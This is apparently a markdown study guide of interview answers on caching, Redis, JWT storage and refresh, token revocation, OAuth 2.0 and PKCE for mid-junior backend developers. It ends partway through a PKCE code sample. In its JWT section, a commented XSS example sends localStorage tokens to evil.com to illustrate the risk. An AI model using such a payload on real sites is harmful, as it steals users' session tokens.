# ✅ Solutions — Day 3: 2 Years Experience (2 YOE)

> **Series:** Backend Interview Prep · Fresher → 10 Years of Experience  
> **Level:** Mid-Junior Developer — 2 Years of Experience  
> **Questions File:** [day-03-2yoe.md](./day-03-2yoe.md)  
> **Total Answers:** 60  

> 💡 **Tip:** At 2 YOE interviewers expect you to know the **"why"** behind tools, not just how to use them. Every answer here explains the reasoning, trade-offs, and real-world context.

---

## 📚 Table of Contents

1. [Caching Strategies](#1-caching-strategies)
2. [JWT & OAuth 2.0 Deep Dive](#2-jwt--oauth-20-deep-dive)
3. [Database Indexing & Query Optimization](#3-database-indexing--query-optimization)
4. [Docker & Containerization](#4-docker--containerization)
5. [Background Jobs & Task Queues](#5-background-jobs--task-queues)
6. [API Design Patterns](#6-api-design-patterns)
7. [NoSQL Databases](#7-nosql-databases)
8. [Web Security — Intermediate](#8-web-security--intermediate)
9. [Performance & Scalability Basics](#9-performance--scalability-basics)
10. [Software Architecture Patterns](#10-software-architecture-patterns)

---

## 1. Caching Strategies

---

**Q1. What is caching? What problem does it solve in backend systems?**

**Answer:**

Caching stores the result of an expensive operation in fast-access storage so that future requests can be served instantly without repeating the work.

**The problem it solves:**

```
Without cache:
Every request → DB query (10–50ms) → response
1000 requests/sec → 1000 DB queries/sec → DB overloaded → slow responses

With cache:
First request  → DB query (10ms) → store in Redis → response
Next 999 reqs  → Redis hit (0.1ms) → response
→ 1 DB query instead of 1000 ✅
```

**Real-world example:**

```js
// ❌ No caching — hits DB on every request
app.get('/products/featured', async (req, res) => {
  // This query joins 4 tables and takes 200ms
  const products = await db.query(`
    SELECT p.*, AVG(r.rating) as avg_rating, COUNT(o.id) as order_count
    FROM products p
    LEFT JOIN reviews r ON p.id = r.product_id
    LEFT JOIN order_items o ON p.id = o.product_id
    WHERE p.featured = true
    GROUP BY p.id
    ORDER BY order_count DESC
    LIMIT 10
  `);
  res.json(products);
});

// ✅ With caching — DB hit only once per minute
app.get('/products/featured', async (req, res) => {
  const CACHE_KEY = 'featured_products';
  const TTL = 60; // 1 minute

  // Try cache first
  const cached = await redis.get(CACHE_KEY);
  if (cached) {
    return res.json(JSON.parse(cached)); // 0.1ms instead of 200ms
  }

  // Cache miss — query DB
  const products = await db.query('...(complex query)...');

  // Store result in cache
  await redis.setex(CACHE_KEY, TTL, JSON.stringify(products));

  res.json(products);
});
```

**What caching solves:**
- **Latency** — memory (~0.1ms) vs DB (~10–200ms) = 100–2000x faster.
- **Throughput** — serve more requests without scaling the DB.
- **Cost** — fewer DB queries = lower RDS/cloud database bills.
- **Resilience** — can serve cached data even when DB is briefly unavailable.

> 📖 Reference: [Caching Overview — AWS](https://aws.amazon.com/caching/)

---

**Q2. What is the difference between in-memory cache, distributed cache, and CDN cache?**

**Answer:**

| Type | Where stored | Scope | Speed | Use case |
|------|-------------|-------|-------|---------|
| **In-memory** | Inside the app process (RAM) | Single server only | Fastest (~ns) | Per-process short-lived data |
| **Distributed** | External cache server (Redis/Memcached) | Shared across all servers | Fast (~0.1ms) | Session data, shared API responses |
| **CDN** | Edge servers globally | All users near a region | Varies by location | Static files, public API responses |

**Code examples:**

```js
// ── 1. In-Memory Cache (process-local) ──────────────────────────────
// Simple: JS Map or object
const cache = new Map();

app.get('/config', (req, res) => {
  if (cache.has('appConfig')) {
    return res.json(cache.get('appConfig')); // nanoseconds
  }
  const config = loadConfig();
  cache.set('appConfig', config);
  res.json(config);
});
// ⚠️ Problem: each of your 8 Node.js cluster workers has its OWN cache
// → inconsistent data across workers
// → lost on restart

// ── 2. Distributed Cache (Redis) ────────────────────────────────────
// Shared across ALL server instances
const redis = require('ioredis');
const client = new redis(process.env.REDIS_URL);

app.get('/user/:id', async (req, res) => {
  const key = `user:${req.params.id}`;
  const cached = await client.get(key);

  if (cached) return res.json(JSON.parse(cached)); // ~0.1ms

  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
  await client.setex(key, 300, JSON.stringify(user)); // cache 5 minutes
  res.json(user);
});
// ✅ All 8 workers share the same Redis — consistent

// ── 3. CDN Cache (Cloudflare/CloudFront) ────────────────────────────
// Set cache headers so CDN stores the response at the edge
app.get('/products', async (req, res) => {
  const products = await getProducts();
  res.set('Cache-Control', 'public, max-age=300, s-maxage=600');
  // s-maxage=600: CDN caches for 10 minutes
  // max-age=300: browser caches for 5 minutes
  res.json(products);
});
// ✅ User in Mumbai hits Cloudflare's Mumbai edge, not your US server
```

> 📖 Reference: [Types of Caching — Cloudflare](https://www.cloudflare.com/learning/cdn/what-is-caching/)

---

**Q3. Explain the Cache-Aside (Lazy Loading) pattern. What are its pros and cons?**

**Answer:**

In **Cache-Aside**, the application manages the cache manually. It checks the cache first, and only queries the database on a miss — then populates the cache.

```
Read flow:
App → Check Cache → HIT  → return cached data
                 → MISS → query DB → store in cache → return data

Write flow:
App → write to DB → invalidate/update cache entry
```

**Full implementation example:**

```js
class UserService {
  constructor(db, redis) {
    this.db = db;
    this.redis = redis;
  }

  async getUser(userId) {
    const cacheKey = `user:${userId}`;

    // 1. Check cache
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      console.log('Cache HIT');
      return JSON.parse(cached);
    }

    // 2. Cache MISS — fetch from DB
    console.log('Cache MISS — fetching from DB');
    const user = await this.db.query(
      'SELECT * FROM users WHERE id = ?', [userId]
    );

    if (!user) return null;

    // 3. Populate cache for next time (TTL: 5 minutes)
    await this.redis.setex(cacheKey, 300, JSON.stringify(user));

    return user;
  }

  async updateUser(userId, data) {
    // 4. Update DB
    await this.db.query(
      'UPDATE users SET ? WHERE id = ?', [data, userId]
    );

    // 5. Invalidate cache — force fresh fetch next time
    await this.redis.del(`user:${userId}`);
    // Alternative: update cache with new data
    // await this.redis.setex(`user:${userId}`, 300, JSON.stringify({...existingUser, ...data}));
  }
}
```

**Pros and Cons:**

| Pros | Cons |
|------|------|
| Cache only populated for data that's actually requested | First request always slow (cold start) |
| Cache failure doesn't block reads (falls back to DB) | Risk of stale data between DB write and cache invalidation |
| Works well for read-heavy workloads | Manual cache management — easy to forget to invalidate |
| Flexible TTL per key | DB and cache can temporarily diverge (consistency window) |

> 📖 Reference: [Cache-Aside Pattern — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/patterns/cache-aside)

---

**Q4. What is the difference between Write-Through and Write-Behind (Write-Back) caching?**

**Answer:**

These patterns describe what happens to the cache when data is **written**.

**Write-Through:** Every write goes to DB AND cache simultaneously.

```js
async function updateProductPrice(productId, newPrice) {
  // Write to DB
  await db.query('UPDATE products SET price = ? WHERE id = ?', [newPrice, productId]);

  // Write to cache at the same time (synchronously)
  await redis.setex(`product:${productId}`, 3600, JSON.stringify({ ...product, price: newPrice }));

  return { success: true };
}
// ✅ Cache always up-to-date
// ❌ Every write has double latency (DB + Redis)
// ❌ Cache fills with data that may never be read (cache pollution)
```

**Write-Behind (Write-Back):** Write to cache immediately, write to DB asynchronously later.

```js
// High-speed writes: update cache instantly, batch-write to DB later
async function trackPageView(pageId) {
  const key = `page:views:${pageId}`;

  // Instantly update cache — no DB wait
  await redis.incr(key);

  // Queue a DB write to happen later (every 60 seconds)
  await jobQueue.add('flush-page-views', { pageId }, { delay: 60000 });
}

// Background job flushes accumulated counts to DB
jobQueue.process('flush-page-views', async (job) => {
  const { pageId } = job.data;
  const views = await redis.get(`page:views:${pageId}`);
  await db.query('UPDATE pages SET view_count = view_count + ? WHERE id = ?',
    [views, pageId]
  );
  await redis.del(`page:views:${pageId}`);
});
// ✅ Extremely fast writes (in-memory only)
// ❌ Risk of data loss if cache crashes before DB write
// ❌ More complex — harder to implement correctly
```

**Comparison:**

| | Write-Through | Write-Behind |
|--|--------------|-------------|
| Consistency | Strong (cache = DB always) | Eventual (DB lags behind cache) |
| Write speed | Slower (waits for both DB + cache) | Fastest (cache only) |
| Data loss risk | None | Yes (if cache crashes) |
| Use case | Financial data, user profiles | Analytics counters, view counts, likes |

> 📖 Reference: [Caching Strategies — Hazelcast](https://hazelcast.com/blog/a-hitchhikers-guide-to-caching-patterns/)

---

**Q5. What is a cache eviction policy? Explain LRU, LFU, and FIFO.**

**Answer:**

When a cache reaches its memory limit, an **eviction policy** decides which entries to remove to make room for new ones.

| Policy | Full Name | How it works | Best for |
|--------|-----------|-------------|---------|
| **LRU** | Least Recently Used | Evict the item that hasn't been accessed for the longest time | General purpose — most common |
| **LFU** | Least Frequently Used | Evict the item accessed the fewest total times | Long-lived data with clear hot/cold patterns |
| **FIFO** | First In, First Out | Evict the oldest-inserted item regardless of usage | Simple queues, time-sequenced data |
| **TTL** | Time To Live | Evict after a set time regardless of usage | Data with known freshness requirements |

**Visual example — LRU with 3 slots:**

```
Access sequence: A, B, C, D (cache full after A, B, C)

State:  [A, B, C]
Access D → cache full → evict LRU (A, least recently used)
State:  [B, C, D]
Access B → B is now most recently used
State:  [C, D, B]
Access E → evict LRU (C)
State:  [D, B, E]
```

**Redis eviction policy configuration:**

```bash
# redis.conf
maxmemory 256mb
maxmemory-policy allkeys-lru    # LRU across all keys (most common)
# Other options:
# allkeys-lfu                   # LFU across all keys
# volatile-lru                  # LRU only among keys with TTL set
# volatile-ttl                  # evict keys with soonest TTL first
# noeviction                    # return error when memory full (dangerous!)
```

```js
// In Node.js: LRU cache library
const LRU = require('lru-cache');

const cache = new LRU({
  max: 500,            // max 500 items
  ttl: 1000 * 60 * 5, // 5 minute TTL
  // Uses LRU eviction automatically when max is reached
});

cache.set('user:1', { id: 1, name: 'Alice' });
cache.set('user:2', { id: 2, name: 'Bob' });

const user = cache.get('user:1'); // marks user:1 as recently used
```

> 📖 Reference: [Cache Eviction Policies — Redis Docs](https://redis.io/docs/reference/eviction/)

---

**Q6. What is a cache stampede (thundering herd problem)? How do you prevent it?**

**Answer:**

A **cache stampede** occurs when a popular cache entry expires and many concurrent requests simultaneously find a cache miss — all of them race to query the database and repopulate the cache at the same time, overwhelming the DB.

```
Normal operation:
1000 req/sec → cache HIT → DB: 0 queries/sec ✅

Cache entry expires:
1000 simultaneous requests → cache MISS → 1000 concurrent DB queries → DB crash! 💥
```

**Prevention strategies:**

```js
// ── Strategy 1: Mutex Lock (only one request rebuilds cache) ────────
const redis = require('ioredis');
const client = new redis();

async function getPopularProducts() {
  const CACHE_KEY = 'popular_products';
  const LOCK_KEY  = 'lock:popular_products';
  const TTL = 300;

  // Check cache
  const cached = await client.get(CACHE_KEY);
  if (cached) return JSON.parse(cached);

  // Try to acquire lock (only ONE worker wins)
  const lockAcquired = await client.set(LOCK_KEY, '1', 'NX', 'EX', 10);

  if (lockAcquired) {
    try {
      // This worker rebuilds the cache
      const products = await db.query('SELECT * FROM products ORDER BY sales DESC LIMIT 20');
      await client.setex(CACHE_KEY, TTL, JSON.stringify(products));
      return products;
    } finally {
      await client.del(LOCK_KEY); // release lock
    }
  } else {
    // Other workers wait briefly and retry
    await new Promise(resolve => setTimeout(resolve, 50));
    return getPopularProducts(); // retry — cache likely populated now
  }
}

// ── Strategy 2: Early Expiry / Probabilistic Refresh ────────────────
// Refresh cache slightly BEFORE it expires (no stampede ever happens)
async function getWithEarlyRefresh(key, ttl, fetchFn) {
  const data = await client.get(key);
  if (data) {
    const { value, expiresAt } = JSON.parse(data);
    const secondsLeft = (expiresAt - Date.now()) / 1000;

    // If within 10% of expiry, refresh in background (only one request does this)
    if (secondsLeft < ttl * 0.1) {
      fetchFn().then(fresh => {
        client.setex(key, ttl, JSON.stringify({
          value: fresh,
          expiresAt: Date.now() + ttl * 1000
        }));
      });
    }
    return value; // still serve stale data while refreshing
  }

  // Cold start
  const fresh = await fetchFn();
  await client.setex(key, ttl, JSON.stringify({
    value: fresh,
    expiresAt: Date.now() + ttl * 1000
  }));
  return fresh;
}

// ── Strategy 3: Staggered TTLs ──────────────────────────────────────
// Add random jitter to TTL so all keys don't expire simultaneously
function jitteredTTL(baseTTL) {
  const jitter = Math.floor(Math.random() * baseTTL * 0.1); // ±10%
  return baseTTL + jitter;
}
await client.setex('products:page:1', jitteredTTL(300), data);
await client.setex('products:page:2', jitteredTTL(300), data);
// Without jitter: both expire at exactly t=300 → simultaneous stampede
// With jitter: one expires at 297, other at 312 → staggered
```

> 📖 Reference: [Cache Stampede — Wikipedia](https://en.wikipedia.org/wiki/Cache_stampede)

---

**Q7. What is cache invalidation? Why is it considered one of the hardest problems in CS?**

**Answer:**

**Cache invalidation** is the process of removing or updating cached data when the source of truth (database) changes. Phil Karlton famously said:

> *"There are only two hard things in Computer Science: cache invalidation and naming things."*

**Why it's hard:**

```js
// Scenario: user updates their profile
// What needs to be invalidated?

await db.query('UPDATE users SET name = ?, email = ? WHERE id = ?',
  ['Alice Smith', 'alice@new.com', 42]
);

// ❌ Easy to forget these caches:
await redis.del('user:42');                    // direct user cache
await redis.del('user:profile:42');            // profile page cache
await redis.del('user:orders:42');             // orders might show user name
await redis.del('admin:users:list');           // admin user list cache
await redis.del('search:users:alice');         // search cache
await redis.del('leaderboard');                // if leaderboard shows usernames
await redis.del('notification:recipients:42'); // notification cache
// Miss even one → stale data shown somewhere ← the hard part
```

**Common invalidation strategies:**

```js
// ── 1. TTL-based (simplest — accept eventual consistency) ────────────
await redis.setex('user:42', 300, JSON.stringify(user));
// Just let it expire. Stale for up to 5 minutes — acceptable for most cases.

// ── 2. Event-based invalidation (cache listens to DB changes) ────────
// Use Debezium CDC or DB triggers to emit events when data changes
eventBus.on('user.updated', async ({ userId }) => {
  const patterns = [
    `user:${userId}`,
    `user:profile:${userId}`,
    `user:orders:${userId}`,
  ];
  await Promise.all(patterns.map(key => redis.del(key)));
});

// ── 3. Cache tags / grouped invalidation ─────────────────────────────
// Tag related cache entries so you can invalidate groups at once
async function cacheWithTags(key, value, tags, ttl) {
  await redis.setex(key, ttl, JSON.stringify(value));
  // Associate key with each tag
  for (const tag of tags) {
    await redis.sadd(`tag:${tag}`, key);
    await redis.expire(`tag:${tag}`, ttl + 60);
  }
}

async function invalidateByTag(tag) {
  const keys = await redis.smembers(`tag:${tag}`);
  if (keys.length) await redis.del(...keys, `tag:${tag}`);
}

// Cache user data with tags
await cacheWithTags('user:42', user, ['user:42', 'users:list'], 300);

// Invalidate everything tagged with 'user:42'
await invalidateByTag('user:42'); // deletes user:42, AND its appearance in users:list
```

> 📖 Reference: [Cache Invalidation — Martin Fowler](https://martinfowler.com/bliki/TwoHardThings.html)

---

**Q8. What is Redis? What are its common use cases beyond caching?**

**Answer:**

**Redis** (Remote Dictionary Server) is an in-memory data structure store — often called a "data structure server" rather than just a cache. It supports strings, lists, sets, sorted sets, hashes, streams, and more.

**Use cases beyond caching:**

```js
const redis = require('ioredis');
const client = new redis();

// ── 1. Session Store ─────────────────────────────────────────────────
// Store user sessions in Redis (shared across all servers)
await client.setex(`session:${sessionId}`, 3600, JSON.stringify({
  userId: 42, role: 'admin', loginTime: Date.now()
}));

// ── 2. Rate Limiting ─────────────────────────────────────────────────
async function rateLimit(userId, limit = 100, windowSeconds = 60) {
  const key = `ratelimit:${userId}:${Math.floor(Date.now() / 60000)}`;
  const count = await client.incr(key);
  if (count === 1) await client.expire(key, windowSeconds);
  return count <= limit;
}

// ── 3. Pub/Sub (real-time messaging) ─────────────────────────────────
// Publisher: send a message
await client.publish('notifications:user:42', JSON.stringify({
  type: 'ORDER_SHIPPED', orderId: 99
}));

// Subscriber: listen for messages
const subscriber = client.duplicate();
await subscriber.subscribe('notifications:user:42');
subscriber.on('message', (channel, message) => {
  const event = JSON.parse(message);
  sendWebSocketNotification(event);
});

// ── 4. Leaderboard (Sorted Set) ──────────────────────────────────────
// Add/update score
await client.zadd('game:leaderboard', 1500, 'player:alice');
await client.zadd('game:leaderboard', 2200, 'player:bob');
await client.zadd('game:leaderboard', 800,  'player:charlie');

// Get top 10 players with scores (highest first)
const top10 = await client.zrevrangebyscore(
  'game:leaderboard', '+inf', '-inf', 'WITHSCORES', 'LIMIT', 0, 10
);

// Get a player's rank
const rank = await client.zrevrank('game:leaderboard', 'player:alice');

// ── 5. Distributed Lock ──────────────────────────────────────────────
const lockKey = `lock:payment:${orderId}`;
const acquired = await client.set(lockKey, '1', 'NX', 'EX', 30);
// NX = only set if not exists; EX = expire in 30 seconds

// ── 6. Job Queue (using BullMQ) ──────────────────────────────────────
const { Queue } = require('bullmq');
const emailQueue = new Queue('emails', { connection: client });
await emailQueue.add('send-welcome', { userId: 42, email: 'alice@example.com' });
```

> 📖 Reference: [Redis Use Cases — Redis Docs](https://redis.io/docs/about/)

---

**Q9. What is a TTL (Time To Live) in caching? How do you decide what TTL to set?**

**Answer:**

**TTL** is a duration after which a cache entry automatically expires and is removed. It prevents stale data from living in the cache forever.

```js
// Set TTL in Redis
await redis.setex('user:42', 300, JSON.stringify(user)); // expires in 300 seconds
await redis.set('user:42', JSON.stringify(user), 'EX', 300); // same thing
await redis.set('user:42', JSON.stringify(user), 'PX', 300000); // in milliseconds

// Check remaining TTL
const ttl = await redis.ttl('user:42'); // returns seconds remaining (-1 = no TTL, -2 = doesn't exist)
```

**How to decide TTL — based on data characteristics:**

| Data | Recommended TTL | Reasoning |
|------|----------------|-----------|
| User session | 30 minutes–24 hours | Security + UX balance |
| User profile | 5–15 minutes | Changes infrequently; some staleness acceptable |
| Product catalog | 1–10 minutes | Changes rarely, reads very heavy |
| Home page featured items | 1–5 minutes | Content team updates a few times/day |
| Real-time stock price | 1–5 seconds | Must be fresh |
| Exchange rates | 1 minute | Changes frequently but not by the second |
| Static config | 1 hour+ | Almost never changes |
| Search autocomplete | 10–30 minutes | Acceptable eventual consistency |

**Decision framework:**

```
TTL decision questions:
1. How often does this data change in the DB? → shorter TTL for frequent changes
2. How bad is it to show stale data?          → financial data = very bad → short TTL
3. How expensive is the DB query?             → expensive query → longer TTL
4. How many requests hit this data?           → viral/hot data → longer TTL
5. Can I invalidate on write instead?         → yes → use longer TTL + invalidation
```

```js
// ✅ Different TTLs for different data types
const TTL = {
  USER_PROFILE:    5  * 60,  // 5 minutes
  PRODUCT_DETAIL:  10 * 60,  // 10 minutes
  FEATURED_LIST:   2  * 60,  // 2 minutes
  EXCHANGE_RATE:   60,        // 1 minute
  CONFIG:          60 * 60,  // 1 hour
  USER_SESSION:    30 * 60,  // 30 minutes
};
```

> 📖 Reference: [TTL in Caching — Cloudflare](https://www.cloudflare.com/learning/cdn/glossary/time-to-live-ttl/)

---

## 2. JWT & OAuth 2.0 Deep Dive

---

**Q10. What are the security risks of storing a JWT in localStorage vs an HttpOnly cookie?**

**Answer:**

| | localStorage | HttpOnly Cookie |
|--|-------------|----------------|
| XSS vulnerability | ❌ Yes — JS can read it | ✅ No — JS cannot access HttpOnly cookies |
| CSRF vulnerability | ✅ No — not auto-sent | ❌ Yes — browser auto-attaches cookies |
| Access by JS | Yes | No |
| Sent automatically | No (must add to headers manually) | Yes (browser handles it) |
| Works across tabs | Yes | Yes |
| Server can set | No (client-side only) | Yes |

**localStorage attack example:**

```js
// Attacker's XSS payload injected into your page:
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))</script>
// → All tokens instantly stolen from every user who visits the compromised page

// ❌ Risky: storing JWT in localStorage
localStorage.setItem('token', jwt);
// Every fetch:
fetch('/api/orders', {
  headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
});
```

**HttpOnly Cookie — protected from XSS:**

```js
// ✅ Server sets HttpOnly cookie — JS cannot read it
app.post('/login', async (req, res) => {
  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '15m' });

  res.cookie('accessToken', token, {
    httpOnly: true,  // ← JS cannot read this cookie
    secure:   true,  // ← only sent over HTTPS
    sameSite: 'Strict', // ← prevents CSRF
    maxAge:   15 * 60 * 1000 // 15 minutes
  });

  res.json({ message: 'Logged in' });
});

// Middleware reads from cookie (not Authorization header)
app.use((req, res, next) => {
  const token = req.cookies.accessToken; // auto-attached by browser
  if (!token) return res.status(401).json({ error: 'Not authenticated' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

**Best practice for SPAs:** Store access token in memory (JS variable), refresh token in HttpOnly cookie. This way XSS can steal the short-lived access token at worst, but cannot silently obtain new tokens.

> 📖 Reference: [JWT Storage — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)

---

**Q11. What is JWT token expiry? How do you handle token refresh without logging the user out?**

**Answer:**

JWT expiry (`exp` claim) makes tokens time-limited for security. A compromised token is only valid until it expires. But short expiry = frequent user logouts if not handled properly.

**Silent token refresh flow:**

```
Timeline:
t=0:   User logs in → gets accessToken (15min) + refreshToken (30 days)
t=14m: accessToken about to expire
t=15m: accessToken expired → next API call fails with 401

Without silent refresh: User is logged out and must re-enter credentials 😩
With silent refresh: New accessToken obtained transparently — user doesn't notice ✅
```

**Implementation:**

```js
// ── Server: refresh endpoint ─────────────────────────────────────────
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken; // HttpOnly cookie
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

    // Verify it hasn't been revoked
    const stored = await redis.get(`refreshToken:${payload.userId}`);
    if (stored !== refreshToken) {
      return res.status(401).json({ error: 'Refresh token revoked' });
    }

    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: payload.userId, role: payload.role },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch {
    res.clearCookie('refreshToken');
    res.status(401).json({ error: 'Invalid refresh token — please log in again' });
  }
});

// ── Client: axios interceptor for silent refresh ─────────────────────
const axios = require('axios');

let accessToken = null; // stored in memory — not localStorage!

const api = axios.create({ baseURL: '/api', withCredentials: true });

// Attach token to every request
api.interceptors.request.use(config => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// On 401, silently refresh and retry
api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Refresh token is in HttpOnly cookie — sent automatically
        const { data } = await axios.post('/auth/refresh', {}, { withCredentials: true });
        accessToken = data.accessToken; // store new token in memory

        // Retry the original failed request with new token
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return api(originalRequest);
      } catch {
        // Refresh failed → redirect to login
        window.location.href = '/login';
      }
    }

    return Promise.reject(error);
  }
);
```

> 📖 Reference: [Silent Refresh — Auth0](https://auth0.com/docs/tokens/refresh-tokens/use-refresh-tokens)

---

**Q12. What is token revocation? Why is it hard with JWTs and how do you work around it?**

**Answer:**

**Token revocation** means invalidating a token before its natural expiry — e.g., when a user logs out, changes password, or is banned.

**Why it's hard with JWTs:**
JWTs are **stateless** — the server verifies the signature without consulting any database. There's no central registry of "valid" tokens. The token is valid until the `exp` time, regardless of what happened on the server.

```
Problem:
User logs out at t=0
Access token still valid until t=15m
If attacker has the token, they can still use the API for 15 minutes! 😱
```

**Solutions:**

```js
// ── Solution 1: Short TTL + Refresh Token Rotation ───────────────────
// Access token: 5–15 minutes TTL
// Accept that a compromised token is valid for at most 15 minutes
// This is the most common production approach

// ── Solution 2: Token Blocklist (Denylist) in Redis ──────────────────
// On logout: add token JTI (JWT ID) to blocklist
app.post('/logout', requireAuth, async (req, res) => {
  const token = req.headers.authorization.split(' ')[1];
  const payload = jwt.decode(token);

  // Add to blocklist until natural expiry
  const ttl = payload.exp - Math.floor(Date.now() / 1000);
  if (ttl > 0) {
    await redis.setex(`blocklist:${payload.jti}`, ttl, '1');
  }

  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});

// In auth middleware: check blocklist
const requireAuth = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  const payload = jwt.verify(token, process.env.JWT_SECRET);

  // Check blocklist (one Redis lookup per request)
  const isRevoked = await redis.exists(`blocklist:${payload.jti}`);
  if (isRevoked) return res.status(401).json({ error: 'Token revoked' });

  req.user = payload;
  next();
};

// Issue tokens with JTI (JWT ID)
const token = jwt.sign(
  { userId: user.id, role: user.role, jti: crypto.randomUUID() },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// ── Solution 3: Version number in token ──────────────────────────────
// Store a tokenVersion on the user record; increment on logout/password change
const token = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// In middleware:
const requireAuth = async (req, res, next) => {
  const payload = jwt.verify(token, process.env.JWT_SECRET);

  // DB lookup to check version (makes it stateful — one DB query per request)
  const user = await User.findById(payload.userId);
  if (user.tokenVersion !== payload.tokenVersion) {
    return res.status(401).json({ error: 'Token invalidated' });
  }
  // ...
};
// On logout: await User.update(userId, { tokenVersion: tokenVersion + 1 });
// All existing tokens for this user immediately invalid
```

> 📖 Reference: [JWT Revocation — Pragmatic Web Security](https://pragmaticwebsecurity.com/articles/oauthoidc/jwt-token-revocation.html)

---

**Q13. Explain the OAuth 2.0 Authorization Code Flow step by step.**

**Answer:**

The **Authorization Code Flow** is used when a server-side app wants to access a user's data on a third-party service (e.g., "Login with Google").

```
Actors:
- User (Resource Owner)
- Your App (Client)
- Google Auth Server (Authorization Server)
- Google APIs (Resource Server)

Step-by-step:
```

```
1. User clicks "Login with Google" on your app

2. Your app redirects user to Google's auth page:
   GET https://accounts.google.com/o/oauth2/auth
   ?client_id=YOUR_CLIENT_ID
   &redirect_uri=https://yourapp.com/auth/callback
   &response_type=code
   &scope=openid email profile
   &state=random_csrf_token_abc123   ← prevents CSRF

3. Google shows login/consent screen
   User: "Yes, allow yourapp to access my profile"

4. Google redirects back to your app with an authorization code:
   GET https://yourapp.com/auth/callback
   ?code=4/0AX4XfWi...abc
   &state=random_csrf_token_abc123

5. Your backend validates state, then exchanges code for tokens:
   POST https://oauth2.googleapis.com/token
   {
     code:          "4/0AX4XfWi...abc",
     client_id:     "YOUR_CLIENT_ID",
     client_secret: "YOUR_CLIENT_SECRET",  ← kept on server, never exposed to browser
     redirect_uri:  "https://yourapp.com/auth/callback",
     grant_type:    "authorization_code"
   }

6. Google returns tokens:
   {
     access_token:  "ya29.A0ARrdaM...",
     refresh_token: "1//0gLcP...",
     id_token:      "eyJhbGci...",  ← JWT with user info (OpenID Connect)
     expires_in:    3600
   }

7. Your app uses access_token to call Google APIs:
   GET https://www.googleapis.com/userinfo/v2/me
   Authorization: Bearer ya29.A0ARrdaM...
   → { id: "123", email: "alice@gmail.com", name: "Alice" }

8. Create/find user in your DB, issue your own session/JWT
```

**Node.js implementation:**

```js
const { google } = require('googleapis');

const oauth2Client = new google.auth.OAuth2(
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
  'https://yourapp.com/auth/google/callback'
);

// Step 2: Redirect to Google
app.get('/auth/google', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  req.session.oauthState = state;

  const url = oauth2Client.generateAuthUrl({
    access_type: 'offline',
    scope: ['openid', 'email', 'profile'],
    state
  });
  res.redirect(url);
});

// Step 4-8: Handle callback
app.get('/auth/google/callback', async (req, res) => {
  const { code, state } = req.query;

  // Validate state (CSRF protection)
  if (state !== req.session.oauthState) {
    return res.status(400).json({ error: 'Invalid state — possible CSRF attack' });
  }

  // Exchange code for tokens
  const { tokens } = await oauth2Client.getToken(code);
  oauth2Client.setCredentials(tokens);

  // Get user info
  const oauth2 = google.oauth2({ version: 'v2', auth: oauth2Client });
  const { data: googleUser } = await oauth2.userinfo.get();

  // Find or create user in your DB
  let user = await User.findByEmail(googleUser.email);
  if (!user) {
    user = await User.create({
      email:    googleUser.email,
      name:     googleUser.name,
      googleId: googleUser.id,
      avatarUrl: googleUser.picture
    });
  }

  // Issue your own JWT
  const jwt = signJwt({ userId: user.id, role: user.role });
  res.cookie('accessToken', jwt, { httpOnly: true, secure: true });
  res.redirect('/dashboard');
});
```

> 📖 Reference: [Authorization Code Flow — Auth0](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow)

---

**Q14. What is PKCE (Proof Key for Code Exchange)? Why was it introduced?**

**Answer:**

PKCE (pronounced "pixy") is an extension to the Authorization Code Flow that prevents **authorization code interception attacks** in public clients (mobile apps, SPAs) that can't securely store a `client_secret`.

**The attack PKCE prevents:**

```
Normal Auth Code Flow (no PKCE):
1. App requests code → Google returns code via redirect
2. ❌ Malicious app on the same device intercepts the redirect URL and steals the code
3. Attacker exchanges code for tokens using the stolen authorization code
```

**How PKCE works:**

```
1. App generates a random code_verifier: "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

2. App creates code_challenge = BASE64URL(SHA256(code_verifier)):
   "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

3. App sends code_challenge (NOT the verifier) with the auth request:
   GET /auth
   ?code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
   &code_challenge_method=S256
   &...

4. Auth server stores the challenge

5. Even if attacker intercepts the code, they DON'T have code_verifier
   → They can't exchange the code for tokens ✅

6. Legitimate app exchanges code WITH the verifier:
   POST /token
   {
     code:          "stolen_code",
     code_verifier: "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
   }
   Auth server: SHA256(code_verifier) == stored code_challenge? ✅ → grant tokens
```

**Node.js implementation:**

```js
const crypto = require('crypto');

// Generate PKCE pair
function generatePKCE() {
  const verifier = crypto.randomBytes(32).toString('base64url');
  const challenge = crypto
    .createHash('sha256')
    .update(verifier)
    .digest('base64url');
